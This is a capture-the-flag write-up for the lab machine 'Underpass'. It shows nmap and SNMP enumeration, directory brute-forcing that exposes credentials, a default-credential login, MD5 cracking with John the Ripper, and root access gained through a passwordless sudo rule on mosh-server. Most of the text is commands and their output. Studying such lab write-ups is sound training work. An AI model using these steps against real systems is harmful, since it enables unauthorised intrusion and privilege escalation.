# Underpass

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap Scan** | Performed initial enumeration to discover open ports. Identified ports `22` (SSH), `80` (HTTP), and `161/udp` (SNMP). SNMP enumeration revealed a username and the presence of the `dalXXXXXXX` service. |
| 2 | `N/A` | **Directory Brute-Forcing** | Used `dirsearch` to scan the `/dalXXXXXXX` directory. Discovered the `docker-compose.yml` file, which contained sensitive environmental information and database credentials. |
| 3 | `N/A` | **Default Credential Login** | Found default credentials for the `dalXXXXXXX` application in the documentation. Logged into the operator panel, which had a list of users, one of whom had an MD5-hashed password. |
| 4 | `svcMosh` | **MD5 Password Cracking** | Used **John the Ripper** with a wordlist to crack the MD5 hash, revealing the password `undXXXXXXXXXXXXXX`. Used this password to log in via **SSH** as the user `svcMosh`. |
| 5 | `root` | **Privilege Escalation via `mosh-server`** | Discovered a `sudo` misconfiguration that allowed the `svcMosh` user to run `/usr/bin/mosh-server` with `sudo` and without a password. Exploited this by running `mosh --server="sudo /usr/bin/mosh-server" localhost`, which executed the command with `root` privileges, granting a root shell. |


## Nmap Scan Results

```

[root@kali] /home/kali/UnderPass  
❯ nmap underpass.htb -sSCV -Pn -T4  
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2024-12-22 11:26 CST
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|\_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|\_http-server-header: Apache/2.4.52 (Ubuntu)
|\_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 22.04 seconds

```
**TCP Open Ports:** 22, 80

---

### UDP Port Scan

```

[root@kali] /home/kali/UnderPass  
❯ nmap -sU underpass.htb -T5                                                                                                                  ⏎
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2024-12-22 12:50 CST
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.073s latency).
Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
Nmap done: 1 IP address (1 host up) scanned in 100.11 seconds

```
**UDP Open Port:** 161 (snmp)

---

### SNMP Enumeration

```

[root@kali] /home/kali/UnderPass  
❯ snmp-check 10.10.11.48  
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'
[\*] System information:
Host IP address               : 10.10.11.48
Hostname                      : UnDerPass.htb is the only dalXXXXXXX server in the basin\!
Description                   : Linux underpass 5.15.0-126-generic \#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86\_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 00:46:13.58
Uptime system                 : 00:46:04.37
System date                   : 2024-12-22 04:39:09.0

```
The **SNMP** enumeration reveals a hostname **UnDerPass.htb** and a user **steve@underpass.htb**. It also mentions a **dalXXXXXXX** service. A search on its GitHub shows a potential path, `/var/www/dalXXXXXXX`.

---

## Directory Enumeration with Dirsearch

### First Scan: `/dalXXXXXXX/`

```

[root@kali] /home/kali/UnderPass  
❯ dirsearch -u "[http://underpass.htb/dalXXXXXXX/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/)" -t 50                                                                                       ⏎
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See [https://setuptools.pypa.io/en/latest/pkg\_resources.html](https://setuptools.pypa.io/en/latest/pkg_resources.html)
from pkg\_resources import DistributionNotFound, VersionConflict
*|. \_ \_  \_  \_  \_ *|*    v0.4.3  
(*||| *) (/*(*|| (*| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/UnderPass/reports/http\_underpass.htb/\_dalXXXXXXX\_\_24-12-22\_12-58-34.txt
Target: [http://underpass.htb/](https://www.google.com/search?q=http://underpass.htb/) Starting: dalXXXXXXX/                                                                                                                 200 - 221B  - /dalXXXXXXX/.gitignore                             301 - 323B  - /dalXXXXXXX/app  -\>  [http://underpass.htb/dalXXXXXXX/app/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/) 200 - 24KB - /dalXXXXXXX/ChangeLog                              301 - 323B  - /dalXXXXXXX/doc  -\>  [http://underpass.htb/dalXXXXXXX/doc/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/doc/) 200 - 2KB - /dalXXXXXXX/docker-compose.yml 200 - 2KB - /dalXXXXXXX/Dockerfile                             301 - 327B  - /dalXXXXXXX/library  -\>  [http://underpass.htb/dalXXXXXXX/library/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/library/) 200 - 18KB - /dalXXXXXXX/LICENSE                                200 - 10KB - /dalXXXXXXX/README.md                              301 - 325B  - /dalXXXXXXX/setup  -\>  [http://underpass.htb/dalXXXXXXX/setup/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/setup/)

Task Completed

```
The scan reveals a **docker-compose.yml** file. Reviewing this file reveals environmental information and credentials:
* **MYSQL_USER:** radius
* **MYSQL_PASSWORD:** radiusdbpw
* **MYSQL_ROOT_PASSWORD:** radiusrootdbpw
* **DEFAULT_CLIENT_SECRET:** testing123

---

### Second Scan: `/dalXXXXXXX/app/`

```

[root@kali] /home/kali/UnderPass  
❯ dirsearch -u "[http://underpass.htb/dalXXXXXXX/app/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/)" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See [https://setuptools.pypa.io/en/latest/pkg\_resources.html](https://setuptools.pypa.io/en/latest/pkg_resources.html)
from pkg\_resources import DistributionNotFound, VersionConflict
*|. \_ \_  \_  \_  \_ *|*    v0.4.3  
(*||| *) (/*(*|| (*| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/UnderPass/reports/http\_underpass.htb/\_dalXXXXXXX\_app\_\_24-12-22\_15-38-14.txt
Target: [http://underpass.htb/](https://www.google.com/search?q=http://underpass.htb/) Starting: dalXXXXXXX/app/                                                                                                             301 - 330B  - /dalXXXXXXX/app/common  -\>  [http://underpass.htb/dalXXXXXXX/app/common/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/common/) 301 - 329B  - /dalXXXXXXX/app/users  -\>  [http://underpass.htb/dalXXXXXXX/app/users/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/users/) 302 - 0B  - /dalXXXXXXX/app/users/  -\>  home-main.php          200 - 2KB - /dalXXXXXXX/app/users/login.php

Task Completed

```
The scan identifies `/dalXXXXXXX/app/users/login.php`. We also find default credentials from `/dalXXXXXXX/doc/install/INSTALL`.
* **Username:** administrator
* **Password:** radius

---

### Third Scan: `/dalXXXXXXX/app/` (with a different wordlist)

```

[root@kali] /home/kali/UnderPass  
❯ dirsearch -u "[http://underpass.htb/dalXXXXXXX/app/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/)" -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See [https://setuptools.pypa.io/en/latest/pkg\_resources.html](https://setuptools.pypa.io/en/latest/pkg_resources.html)
from pkg\_resources import DistributionNotFound, VersionConflict
*|. \_ \_  \_  \_  \_ *|*    v0.4.3  
(*||| *) (/*(*|| (*| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545
Output File: /home/kali/UnderPass/reports/http\_underpass.htb/\_dalXXXXXXX\_app\_\_24-12-22\_16-13-23.txt
Target: [http://underpass.htb/](https://www.google.com/search?q=http://underpass.htb/) Starting: dalXXXXXXX/app/                                                                                                             301 - 330B  - /dalXXXXXXX/app/common  -\>  [http://underpass.htb/dalXXXXXXX/app/common/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/common/) 301 - 329B  - /dalXXXXXXX/app/users  -\>  [http://underpass.htb/dalXXXXXXX/app/users/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/users/) 301 - 333B  - /dalXXXXXXX/app/operators  -\>  [http://underpass.htb/dalXXXXXXX/app/operators/](https://www.google.com/search?q=http://underpass.htb/dalXXXXXXX/app/operators/)

Task Completed

```
The scan reveals `/dalXXXXXXX/app/operators/`, which can be accessed with the default credentials. The user list inside this panel contains a password hash.

---

## MD5 Crack with John the Ripper

```

[root@kali] /home/kali/UnderPass  
❯ john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
undXXXXXXXXXXXXXX (?)  
1g 0:00:00:00 DONE (2024-12-22 16:34) 8.333g/s 24865Kp/s 24865Kc/s 24865KC/s undiamecaiQ..underthecola
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.

```
The MD5 hash is cracked, and the password is **undXXXXXXXXXXXXXX**. This password can be used to log in via SSH to get `user.txt`.

---

## Privilege Escalation

After gaining user access, `linpeas` is used to find a command with special permissions.

```

svcMosh@underpass:/var/www/html/dalXXXXXXX/app/operators$ sudo -l
Matching Defaults entries for svcMosh on localhost:
env\_reset, mail\_badpass, secure\_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use\_pty
User svcMosh may run the following commands on localhost:
(ALL) NOPASSWD: /usr/bin/mosh-server

```
The user `svcMosh` can run `/usr/bin/mosh-server` with `sudo` and without a password. The default parameter for `mosh` is `--server`. This allows us to execute the command with superuser privileges.

```

svcMosh@underpass:/tmp$ mosh --server="sudo /usr/bin/mosh-server" localhost

```
This command effectively executes the `mosh-server` with `sudo` on the local host, granting a root shell.

---

## Summary
* **User:** The initial foothold was gained by performing a comprehensive scan that included both **TCP** and **UDP** ports, which revealed **SNMP**. SNMP enumeration pointed to the **dalXXXXXXX** service. Further directory brute-forcing revealed a `docker-compose.yml` file with database credentials and the existence of a login panel for operators. The default credentials for `dalXXXXXXX` and a password hash from the user list were used to gain an **SSH** connection.
* **Root:** Privilege escalation was achieved by exploiting a `sudo` misconfiguration that allowed the user to run `mosh-server` with root privileges. By running `mosh --server="sudo /usr/bin/mosh-server" localhost`, a root shell was obtained.
```